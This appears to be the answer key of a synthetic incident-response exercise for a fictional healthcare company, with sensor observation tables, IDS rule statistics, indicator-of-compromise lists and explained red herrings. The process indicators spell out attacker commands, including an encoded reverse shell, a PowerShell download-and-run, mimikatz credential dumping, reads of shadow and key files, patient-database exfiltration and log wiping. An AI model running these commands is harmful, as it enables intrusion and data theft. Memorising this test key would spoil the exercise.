| d97ac9f0-e290-458f-a3c6-d95ad0b0dff1 | ids | delayed: 2 |
| db69382d-245f-46ad-a356-4cd818209233 | ids | delayed: 1 |
| db94250b-1641-445f-9620-717454698fa2 | ids | delayed: 1 |
| dc4ea4af-62d7-4240-aeca-8fa10a3a8ff2 | ids | delayed: 2 |
| e23a7d3a-8514-45df-9107-b2bc25e5e2bc | ids | delayed: 2 |
| e37eb09c-bde4-47fc-a815-c6ecfa526ee8 | ids | delayed: 1 |
| e3a67c52-9cc1-40f8-9be1-a31e0f15e8c0 | ids | delayed: 1 |
| e6cb38ff-80f5-4065-94e5-dadfc5169bb3 | ids | delayed: 1 |
| e7d4d875-ae8f-4b5a-9679-8d3be5aada07 | ids | delayed: 2 |
| e8f8e45f-a81c-46d9-a9fb-094d4a34155f | ids | delayed: 2 |
| ef1bf961-aaaf-4b13-882c-156c6086207f | ids | delayed: 2 |
| evt-001 | asa | delayed: 6 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | web | delayed: 1 |
| evt-001 | zeek | delayed: 2, filtered: 4, visible: 1 |
| evt-002 | asa | delayed: 387, filtered: 1, visible: 1 |
| evt-002 | ecar | delayed: 385, dropped: 4 |
| evt-002 | ids | delayed: 15 |
| evt-002 | web | delayed: 328 |
| evt-002 | zeek | delayed: 538, dropped: 2, filtered: 2, visible: 176 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | delayed: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 2, visible: 2 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 3 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 6 |
| evt-006 | ecar | delayed: 65 |
| evt-006 | syslog | delayed: 8 |
| evt-006 | sysmon | delayed: 19 |
| evt-006 | windows_security | delayed: 5, visible: 1 |
| evt-006 | zeek | delayed: 26, visible: 5 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 4, filtered: 1 |
| evt-008 | ecar | delayed: 7, dropped: 1 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 3 |
| evt-008 | zeek | delayed: 5, visible: 3 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 3, dropped: 1, filtered: 5 |
| evt-012 | ecar | delayed: 18 |
| evt-012 | sysmon | delayed: 7 |
| evt-012 | windows_security | delayed: 23, visible: 1 |
| evt-012 | zeek | delayed: 5, visible: 6 |
| evt-013 | asa | delayed: 3, filtered: 1 |
| evt-013 | ecar | delayed: 46 |
| evt-013 | sysmon | delayed: 43 |
| evt-013 | windows_security | delayed: 20 |
| evt-013 | zeek | delayed: 1, visible: 5 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 23 |
| evt-015 | sysmon | delayed: 21 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 4 |
| evt-016 | ecar | delayed: 34 |
| evt-016 | sysmon | delayed: 34 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | delayed: 2 |
| evt-017 | ecar | delayed: 34 |
| evt-017 | sysmon | delayed: 33 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 3 |
| evt-018 | asa | delayed: 28, out_of_window: 4, visible: 1 |
| evt-018 | ecar | delayed: 37, out_of_window: 4 |
| evt-018 | proxy | delayed: 9, out_of_window: 1 |
| evt-018 | sysmon | delayed: 17, out_of_window: 1 |
| evt-018 | windows_security | delayed: 20, out_of_window: 3 |
| evt-018 | zeek | delayed: 60, out_of_window: 10, visible: 12 |
| evt-019 | asa | delayed: 3, out_of_window: 1 |
| evt-019 | ecar | delayed: 3, out_of_window: 1 |
| evt-019 | proxy | delayed: 3, out_of_window: 1 |
| evt-019 | sysmon | delayed: 3, out_of_window: 1 |
| evt-019 | zeek | delayed: 4, out_of_window: 2, visible: 2 |
| evt-020 | asa | delayed: 23, filtered: 279 |
| evt-020 | ecar | delayed: 300, dropped: 2 |
| evt-020 | ids | delayed: 6, dropped: 3, filtered: 257 |
| evt-020 | sysmon | delayed: 20 |
| evt-020 | windows_security | delayed: 320, visible: 1 |
| evt-020 | zeek | delayed: 450, filtered: 2, visible: 152 |
| evt-021 | asa | delayed: 89, dropped: 1, visible: 1 |
| evt-021 | ecar | delayed: 91 |
| evt-021 | ids | delayed: 18, filtered: 164 |
| evt-021 | windows_security | delayed: 88, visible: 3 |
| evt-021 | zeek | delayed: 118, visible: 64 |
| evt-022 | asa | delayed: 2 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 26 |
| evt-022 | windows_security | delayed: 12 |
| evt-022 | zeek | delayed: 2 |
| evt-023 | asa | filtered: 6 |
| evt-023 | bash_history | visible: 12 |
| evt-023 | ecar | delayed: 40 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 4 |
| evt-023 | zeek | delayed: 6, visible: 4 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 3 |
| evt-025 | ecar | delayed: 30, dropped: 1 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 27 |
| evt-025 | windows_security | delayed: 9 |
| evt-025 | zeek | delayed: 4, visible: 2 |
| evt-026 | asa | delayed: 6, filtered: 3 |
| evt-026 | ecar | delayed: 10 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | windows_security | delayed: 2 |
| evt-026 | zeek | delayed: 24 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 29 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 28 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 6 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 6 |
| evt-032 | ecar | delayed: 17 |
| evt-032 | sysmon | delayed: 17 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 9 |
| evt-033 | sysmon | delayed: 8 |
| evt-033 | windows_security | delayed: 9 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 6, filtered: 2, visible: 1 |
| evt-email-001 | ecar | delayed: 55, dropped: 1 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 50 |
| evt-email-001 | windows_security | delayed: 12 |
| evt-email-001 | zeek | delayed: 11, visible: 9 |
| evt-email-002 | asa | delayed: 2 |
| evt-email-002 | ecar | delayed: 2 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 1 |
| evt-email-002 | windows_security | delayed: 1 |
| evt-email-002 | zeek | delayed: 4 |
| evt-email-003 | all | out_of_window: 27 |
| evt-email-003 | asa | delayed: 6, filtered: 2 |
| evt-email-003 | ecar | delayed: 10 |
| evt-email-003 | syslog | delayed: 12 |
| evt-email-003 | sysmon | delayed: 10 |
| evt-email-003 | windows_security | delayed: 13 |
| evt-email-003 | zeek | delayed: 18, visible: 2 |
| evt-email-004 | asa | delayed: 8, filtered: 4 |
| evt-email-004 | ecar | delayed: 24 |
| evt-email-004 | syslog | delayed: 19 |
| evt-email-004 | windows_security | delayed: 7 |
| evt-email-004 | zeek | delayed: 23, visible: 11 |
| evt-email-005 | asa | delayed: 1 |
| evt-email-005 | ecar | delayed: 1 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | zeek | delayed: 4 |
| evt-email-006 | asa | delayed: 3 |
| evt-email-006 | ecar | delayed: 6 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 5 |
| evt-email-006 | windows_security | delayed: 3 |
| evt-email-006 | zeek | delayed: 7, visible: 2 |
| evt-email-007 | asa | delayed: 8, filtered: 1 |
| evt-email-007 | ecar | delayed: 14 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 6 |
| evt-email-007 | zeek | delayed: 24, visible: 2 |
| evt-email-008 | asa | delayed: 3, filtered: 3 |
| evt-email-008 | ecar | delayed: 38 |
| evt-email-008 | proxy | delayed: 1 |
| evt-email-008 | syslog | delayed: 9 |
| evt-email-008 | sysmon | delayed: 33 |
| evt-email-008 | windows_security | delayed: 7 |
| evt-email-008 | zeek | delayed: 14, visible: 2 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | dropped: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 9, filtered: 2 |
| evt-email-011 | ecar | delayed: 27 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 22 |
| evt-email-011 | windows_security | delayed: 13, visible: 1 |
| evt-email-011 | zeek | delayed: 17, visible: 12 |
| f0a4c1e3-3ac2-4d4d-a7aa-99a20f70b02c | ids | delayed: 1 |
| f2702962-4366-424e-8372-2f45990c5327 | ids | delayed: 1 |
| f36da59f-8c09-4b12-b9c0-146dc372427e | ids | delayed: 1 |
| f4152869-9b8d-4d70-bf3a-b2296d69c63c | ids | delayed: 1 |
| f52ae3c2-b72a-456d-8e06-14ed1374d082 | ids | delayed: 1 |
| f5bd9299-779f-4493-a8ce-a88f88fd54b3 | ids | delayed: 1 |
| f6237bb4-e401-4418-8e2d-b9eba76cf5b5 | ids | delayed: 1 |
| f689aa56-b8a6-4778-a48e-1f05017afc1a | ids | delayed: 1 |
| f6e5eb62-1d64-4229-ac21-c9ca43179e9d | ids | delayed: 1 |
| f8d234a8-0b54-4347-967e-43e0379279e3 | ids | delayed: 1 |
| f946cdb8-3b2f-4069-a56d-468f19cb3e11 | ids | delayed: 1 |
| fbc5b615-2b63-43bd-9d60-216c3a6299a5 | ids | delayed: 1 |
| fc8adac4-1697-4be0-9752-16da50a3898a | ids | delayed: 1 |
| fd29bf4e-0237-4039-9924-36e6827a6a97 | ids | delayed: 1 |
| red_herring:rh-001 | ecar | delayed: 3 |
| red_herring:rh-001 | windows_security | delayed: 3 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 38 |
| red_herring:rh-002 | sysmon | delayed: 37 |
| red_herring:rh-002 | windows_security | delayed: 9, visible: 3 |
| red_herring:rh-002 | zeek | delayed: 1 |
| red_herring:rh-003 | asa | delayed: 2 |
| red_herring:rh-003 | ecar | delayed: 5 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | zeek | delayed: 4 |


## IDS Evaluation Summary

Observation totals: delayed=194, dropped=3, filtered=424, visible=1.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000334 | 2 | 2 | 0 | built_in=2 | `605ad7a4e4a9` |
| snort-core | 1:2000357 | 2 | 2 | 0 | built_in=2 | `d06aff96f94f` |
| snort-core | 1:2000560 | 2 | 2 | 0 | built_in=2 | `c658cecd80ee` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `3f76de50c681` |
| snort-core | 1:2016149 | 4 | 4 | 0 | built_in=4 | `f37d8b9751a5` |
| snort-core | 1:2024291 | 10 | 10 | 0 | built_in=10 | `02be83492fe8` |
| snort-core | 1:2027757 | 6 | 6 | 0 | built_in=6 | `ad00b5f9742f` |
| snort-core | 1:2027863 | 8 | 8 | 0 | built_in=8 | `3460ba00ba5d` |
| snort-core | 1:2027865 | 103 | 21 | 82 | authored_attachment=9, built_in=12 | `c3bb45e9af35` |
| snort-core | 1:2029706 | 268 | 11 | 257 | authored_attachment=6, built_in=5 | `e4b5e95177fa` |
| snort-core | 1:366 | 1 | 1 | 0 | built_in=1 | `8a592f7bad07` |
| snort-perimeter | 1:2000334 | 1 | 1 | 0 | built_in=1 | `ab27d6298bb4` |
| snort-perimeter | 1:2000357 | 1 | 1 | 0 | built_in=1 | `1dee9fd0f8a0` |
| snort-perimeter | 1:2000428 | 1 | 1 | 0 | built_in=1 | `b5b110aed308` |
| snort-perimeter | 1:2000575 | 5 | 5 | 0 | built_in=5 | `f3e2c14f188a` |
| snort-perimeter | 1:2002910 | 17 | 15 | 2 | built_in=15 | `66a8f69e8e1a` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `dcdc3440124c` |
| snort-perimeter | 1:2003068 | 7 | 7 | 0 | built_in=7 | `8daaec2867b0` |
| snort-perimeter | 1:2010935 | 4 | 4 | 0 | built_in=4 | `cdd0f591d0ff` |
| snort-perimeter | 1:2013028 | 2 | 2 | 0 | built_in=2 | `8da3bef905ef` |
| snort-perimeter | 1:2013504 | 2 | 2 | 0 | authored_attachment=1, built_in=1 | `214b2afc5366` |
| snort-perimeter | 1:2016149 | 5 | 5 | 0 | built_in=5 | `7364f4f0e7cb` |
| snort-perimeter | 1:2016360 | 3 | 3 | 0 | built_in=3 | `2be775720f5f` |
| snort-perimeter | 1:2018959 | 2 | 2 | 0 | built_in=2 | `1990821e88f9` |
| snort-perimeter | 1:2022476 | 2 | 2 | 0 | built_in=2 | `e73c8f01b0dd` |
| snort-perimeter | 1:2023672 | 2 | 2 | 0 | built_in=2 | `99c43e63a0fb` |
| snort-perimeter | 1:2023882 | 2 | 2 | 0 | built_in=2 | `c43535f9a69b` |
| snort-perimeter | 1:2024290 | 4 | 4 | 0 | built_in=4 | `09cfdf1389e4` |
| snort-perimeter | 1:2024291 | 5 | 5 | 0 | built_in=5 | `83d9dfeb3bcf` |
| snort-perimeter | 1:2024392 | 6 | 6 | 0 | built_in=6 | `bb24701d7610` |
| snort-perimeter | 1:2024897 | 4 | 4 | 0 | built_in=4 | `d9208faabde1` |
| snort-perimeter | 1:2025712 | 5 | 5 | 0 | built_in=5 | `5fc7498bfc77` |
| snort-perimeter | 1:2027316 | 4 | 4 | 0 | built_in=4 | `7657a708ec79` |
| snort-perimeter | 1:2027757 | 4 | 4 | 0 | built_in=4 | `0f6c8cc5c16a` |
| snort-perimeter | 1:2027863 | 7 | 7 | 0 | built_in=7 | `0e588a1dece8` |
| snort-perimeter | 1:2027865 | 95 | 13 | 82 | authored_attachment=9, built_in=4 | `3faba6878b4b` |
| snort-perimeter | 1:2028401 | 1 | 1 | 0 | built_in=1 | `6f128059a838` |
| snort-perimeter | 1:2029706 | 2 | 2 | 0 | built_in=2 | `f5e99c7265ad` |
| snort-perimeter | 1:366 | 6 | 6 | 0 | built_in=6 | `17ebcabb8a6c` |
| snort-perimeter | 1:382 | 5 | 5 | 0 | built_in=5 | `1f43d936073c` |
| snort-perimeter | 1:384 | 6 | 6 | 0 | built_in=6 | `f816f012a761` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C2f9Opb1H2CftoTWRZ
- SMTP Zeek UID: C9qn8vD6QPZYTE7zXf
- SMTP Zeek UID: CBuc05QHp44wwplOuFX
- SMTP Zeek UID: CCpXVO8H4gtkfOR6C8C
- SMTP Zeek UID: CDCMgShwAYH5HLtK7LZ
- SMTP Zeek UID: CHxvhQUnf268pUfrzU
- SMTP Zeek UID: CI8ZZGcfeFCnpKm2o2
- SMTP Zeek UID: CPxFSHnI1446HJVYAg
- SMTP Zeek UID: CRp45R6lIhkJ6V7wyI
- SMTP Zeek UID: CU4XGk3N3CIgyIv3dF
- SMTP Zeek UID: CaViYWII7AH5BhtxX7
- SMTP Zeek UID: CrHwO45AdOlCeTb4ouA
- SMTP Zeek UID: CwzFNQFk80lf5AmQw0
- SMTP Zeek UID: CxCOyPn8Bix0pyIxIj
- SMTP Zeek UID: CznneAErc1m6lFj07kl
- Zeek UID: C7sr5dHdzDR7a6bJ7xE
- Zeek UID: CANWhnHvAAZQl60xJ3E
- Zeek UID: COz9bek7kMFW2xBnnq
- Zeek UID: CUqGJ14aYsOHBI2s6Q
- Zeek UID: CaCAy1lb35DYPu7XR8
- Zeek UID: ChHD4W1oRYdUPGREn
- Zeek UID: ChniifOsBecvX9D9Q0
- Zeek UID: CnEN1yamiEf4NNaZMN
- Zeek UID: CxWXSduz6LZYBoiXHfM
- Zeek UID: CyqZj9j31xVIjMo672k
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:43 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:45 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:46 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:48 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:05:30 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:10:22 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:10:23 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:10:24 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
